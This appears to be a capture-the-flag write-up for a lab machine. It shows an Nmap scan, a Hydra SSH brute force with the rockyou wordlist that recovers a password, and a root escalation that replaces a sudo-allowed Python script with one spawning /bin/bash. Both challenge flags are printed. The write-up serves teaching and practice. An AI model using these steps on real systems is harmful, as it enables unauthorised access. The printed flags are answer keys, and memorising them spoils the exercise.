@@ -1,0 +1,54 @@
+1. Enumeration
+I started with an Nmap scan to identify open ports and services:
+
+Bash
+nmap -sV -sC 10.49.134.17
+Results:
+
+Port 22: SSH (OpenSSH 7.2p2)
+
+Port 80: HTTP (Apache 2.4.18)
+
+robots.txt: Hinted at a disallowed entry /.
+
+2. Exploitation (User Flag)
+Checking the web server, the blog posts were authored by a user named meliodas. I decided to attempt an SSH brute force attack using this username and the rockyou.txt wordlist.
+
+Command:
+
+Bash
+hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.49.134.17 ssh -t4
+Found Credentials: meliodas:iloveyou1
+
+I logged in via SSH and captured the user flag:
+
+user.txt: 6d488cbb3f111d135722c33cb635f4ec
+
+3. Privilege Escalation (Root Flag)
+After gaining access as meliodas, I checked for sudo permissions:
+
+Bash
+sudo -l
+The output showed that the user could run a specific Python script as root without a password:
+(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+
+The Hijack
+The file bak.py was write-protected, but since I had write permissions on the /home/meliodas directory, I could delete the file and recreate it.
+
+Remove the original: rm bak.py
+
+Create a malicious version:
+
+Python
+import os
+os.system("/bin/bash")
+Execute with sudo:
+
+Bash
+sudo /usr/bin/python3 /home/meliodas/bak.py
+I successfully spawned a root shell and captured the final flag:
+
+root.txt: e8c8c6c256c35515d1d344ee0488c617
+
+🏁 Conclusion
+The vulnerability in this machine was a combination of weak credentials (crackable via rockyou.txt) and misconfigured sudo permissions (allowing a user to run a script in a directory they control).
